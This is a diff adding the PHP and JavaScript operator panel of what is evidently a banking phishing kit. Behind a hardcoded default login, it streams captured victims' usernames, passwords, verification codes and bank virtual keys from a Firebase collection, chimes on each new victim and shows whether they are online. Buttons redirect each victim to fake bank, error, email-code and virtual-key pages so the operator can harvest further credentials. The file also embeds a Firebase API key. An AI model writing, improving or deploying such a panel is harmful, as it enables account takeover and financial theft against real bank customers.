@@ -1,0 +1,248 @@
+<?php
+session_start();
+
+$archivo_credenciales = 'credenciales.php';
+
+// Crear el archivo de credenciales por defecto si no existe
+if (!file_exists($archivo_credenciales)) {
+    $datos_por_defecto = "<?php\nreturn [\n    'usuario' => 'admin',\n    'password' => 'tu_password_segura'\n];\n";
+    file_put_contents($archivo_credenciales, $datos_por_defecto);
+}
+
+$credenciales = include $archivo_credenciales;
+$usuario_valido = $credenciales['usuario'] ?? 'admin';
+$password_valido = $credenciales['password'] ?? 'tu_password_segura';
+
+$error = "";
+
+// Procesar el formulario de inicio de sesión
+if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['accion']) && $_POST['accion'] === 'login') {
+    $usuario_ingresado = trim($_POST['usuario'] ?? '');
+    $password_ingresado = $_POST['password'] ?? '';
+
+    if ($usuario_ingresado === $usuario_valido && $password_ingresado === $password_valido) {
+        $_SESSION['autenticado'] = true;
+        header("Location: panel.php");
+        exit();
+    } else {
+        $error = "Usuario o contraseña incorrectos.";
+    }
+}
+?>
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+    <title>Control de Calidad - Dark Mode</title>
+    <style>
+      body {
+        font-family: Arial, sans-serif;
+        padding: 20px;
+        background-color: #343a40;
+        color: #ffffff;
+        font-size: 0.85rem;
+      }
+      h1 { color: #ffffff; font-size: 1.5rem; }
+      .list-group-item {
+        background-color: #495057;
+        border: 1px solid #6c757d;
+        color: #dee2e6;
+        padding: 10px 15px;
+      }
+      .status-dot {
+        height: 10px;
+        width: 10px;
+        border-radius: 50%;
+        display: inline-block;
+        margin-right: 8px;
+      }
+      .status-online {
+        background-color: #28a745;
+        box-shadow: 0 0 6px #28a745;
+      }
+      .status-offline { background-color: #dc3545; }
+      .copy-field {
+        cursor: pointer;
+        transition: opacity 0.2s;
+        margin-right: 15px;
+      }
+      .copy-field:hover { opacity: 0.7; }
+      
+      .data-value { color: #dee2e6 !important; font-weight: normal; }
+      strong { color: #ffffff; font-size: 0.8rem; }
+      
+      /* Estilo del nuevo badge */
+      .badge-pagina {
+          background-color: #17a2b8;
+          color: white;
+          padding: 2px 8px;
+          border-radius: 4px;
+          margin-right: 10px;
+          font-size: 0.75rem;
+      }
+
+      .btn-sm { 
+        font-size: 0.75rem; 
+        padding: 0.25rem 0.4rem; 
+        margin: 2px;
+      }
+      .btn-secondary { background-color: #6c757d; border-color: #6c757d; color: white; }
+
+      /* Estilos para la tarjeta de Login */
+      .login-body {
+          height: 100vh;
+          display: flex;
+          justify-content: center;
+          align-items: center;
+          margin: 0;
+      }
+      .login-card {
+          background-color: #495057;
+          padding: 30px;
+          border-radius: 8px;
+          box-shadow: 0 4px 6px rgba(0,0,0,0.3);
+          width: 100%;
+          max-width: 350px;
+      }
+    </style>
+</head>
+
+<body <?php echo (!isset($_SESSION['autenticado']) || $_SESSION['autenticado'] !== true) ? 'class="login-body"' : ''; ?>>
+    <?php if (!isset($_SESSION['autenticado']) || $_SESSION['autenticado'] !== true): ?>
+      <!-- Formulario de Login -->
+      <div class="login-card">
+          <h3 class="text-center mb-4">🔐 Acceso al Panel</h3>
+          <?php if (!empty($error)): ?>
+              <div class="alert alert-danger p-2 text-center" style="font-size: 0.85rem;"><?php echo $error; ?></div>
+          <?php endif; ?>
+          <form method="POST" action="">
+              <input type="hidden" name="accion" value="login">
+              <div class="form-group">
+                  <label>Usuario</label>
+                  <input type="text" name="usuario" class="form-control" required autocomplete="off">
+              </div>
+              <div class="form-group">
+                  <label>Contraseña</label>
+                  <input type="password" name="password" class="form-control" required>
+              </div>
+              <button type="submit" class="btn btn-primary btn-block mt-3">Ingresar</button>
+          </form>
+      </div>
+    <?php else: ?>
+      <div class="container">
+        <div class="d-flex justify-content-between align-items-center my-3">
+          <h1 class="m-0">🛜 Panel de Control</h1>
+        </div>
+        <div id="data" class="list-group"></div>
+      </div>
+
+      <!-- Elemento de audio oculto para la alerta -->
+      <audio id="notifSound" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3" preload="auto"></audio>
+
+      <script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-app.js"></script>
+      <script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-firestore.js"></script>
+      <script>
+        const firebaseConfig = {
+          apiKey: "AIzaSyDWkga80jjGG2YtF9obwfIf9UuSACayWko",
+          authDomain: "kkkkk-5e2bd.firebaseapp.com",
+          databaseURL: "https://kkkkk-5e2bd-default-rtdb.firebaseio.com",
+          projectId: "kkkkk-5e2bd",
+          storageBucket: "kkkkk-5e2bd.firebasestorage.app",
+          messagingSenderId: "1059258934487",
+          appId: "1:1059258934487:web:72d14c094dc78e6140fc92"
+        };
+        if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
+        const db = firebase.firestore();
+
+        let initialLoad = true; // Variable para evitar que suene al cargar la página por primera vez con los usuarios existentes
+
+        function reproducirSonido() {
+          const sound = document.getElementById("notifSound");
+          if (sound) {
+            sound.currentTime = 0;
+            sound.play().catch(e => console.log("Audio play bloqueado por el navegador:", e));
+          }
+        }
+
+        function copiarTexto(texto, tipo) {
+          navigator.clipboard.writeText(texto).then(() => {
+            const aviso = document.createElement('div');
+            aviso.innerText = `¡${tipo} copiado!`;
+            aviso.style.position = 'fixed'; aviso.style.bottom = '20px'; aviso.style.right = '20px';
+            aviso.style.backgroundColor = '#28a745'; aviso.style.color = 'white';
+            aviso.style.padding = '8px 16px'; aviso.style.borderRadius = '4px';
+            document.body.appendChild(aviso);
+            setTimeout(() => aviso.remove(), 1000);
+          });
+        }
+
+        function escaparHtml(str) {
+            return String(str)
+                .replace(/&/g, '&amp;')
+                .replace(/</g, '&lt;')
+                .replace(/>/g, '&gt;')
+                .replace(/"/g, '&quot;')
+                .replace(/'/g, '&#039;');
+        }
+
+        function displayData(docs) {
+          const dataDiv = document.getElementById("data");
+          dataDiv.innerHTML = ""; 
+          docs.forEach((doc) => {
+            const data = doc.data();
+            const docDiv = document.createElement("div");
+            docDiv.className = "list-group-item flex-column align-items-start mb-1";
+            
+            let isOnline = (data.last_active && (new Date().getTime() - data.last_active.toDate().getTime()) < 10000);
+            
+            const passwordUser = data.password || data.pass || 'N/A';
+            const codigoUser = data.cod1 || data.code || data.codigo || 'N/A';
+            const claveVirtualUser = data.claveVirtual || data.virtualKey || data.clave_virtual || 'N/A';
+            const pagina = data.pagina_actual || '...';
+
+            docDiv.innerHTML = `
+              <div class="d-flex w-100 justify-content-between align-items-center flex-wrap">
+                <div class="d-flex align-items-center flex-wrap mb-2 mb-md-0">
+                  <span class="status-dot ${isOnline ? 'status-online' : 'status-offline'}"></span>
+                  <span class="badge-pagina">${escaparHtml(pagina)}</span>
+                  <span class="copy-field" onclick='copiarTexto(${JSON.stringify(doc.id)}, "Usuario")'><strong>User:</strong> <span class="data-value">${escaparHtml(doc.id)}</span></span>
+                  <span class="copy-field" onclick='copiarTexto(${JSON.stringify(passwordUser)}, "Contraseña")'><strong>Pass:</strong> <span class="data-value">${escaparHtml(passwordUser)}</span></span>
+                  <span class="copy-field" onclick='copiarTexto(${JSON.stringify(codigoUser)}, "Código")'><strong>Cód:</strong> <span class="data-value">${escaparHtml(codigoUser)}</span></span>
+                  <span class="copy-field" onclick='copiarTexto(${JSON.stringify(claveVirtualUser)}, "Clave Virtual")'><strong>Clave Virt:</strong> <span class="data-value">${escaparHtml(claveVirtualUser)}</span></span>
+                </div>
+                <div class="d-flex flex-wrap">
+                  <button class="btn btn-danger btn-sm" onclick="deleteDocument('${doc.id}')">Eliminar</button>
+                  <button class="btn btn-success btn-sm" onclick="actualizarPagina('${doc.id}', 2)">Banco</button>
+                  <button class="btn btn-secondary btn-sm" onclick="actualizarPagina('${doc.id}', 6)">C. Correo</button>
+                  <button class="btn btn-secondary btn-sm" onclick="actualizarPagina('${doc.id}', 5)">C. Error</button>
+                  <button class="btn btn-secondary btn-sm" onclick="actualizarPagina('${doc.id}', 7)">C. Virtual</button>
+                  <button class="btn btn-secondary btn-sm" onclick="actualizarPagina('${doc.id}', 1)">CV. Error</button>
+                  <button class="btn btn-warning btn-sm" onclick="actualizarPagina('${doc.id}', 4)">Inc.</button>
+                  <button class="btn btn-secondary btn-sm" onclick="actualizarPagina('${doc.id}', 3)">Inicio</button>
+                </div>
+              </div>
+            `;
+            dataDiv.appendChild(docDiv);
+          });
+        }
+
+        db.collection("prolme").onSnapshot((snapshot) => {
+          snapshot.docChanges().forEach((change) => {
+            if (change.type === "added") {
+              if (!initialLoad) {
+                reproducirSonido();
+              }
+            }
+          });
+          initialLoad = false;
+          displayData(snapshot.docs);
+        });
+        
+        function deleteDocument(id) { db.collection("prolme").doc(id).delete(); }
+        function actualizarPagina(id, num) { db.collection("prolme").doc(id).update({ page: num }); }
+      </script>
+    <?php endif; ?>
+</body>
+</html>
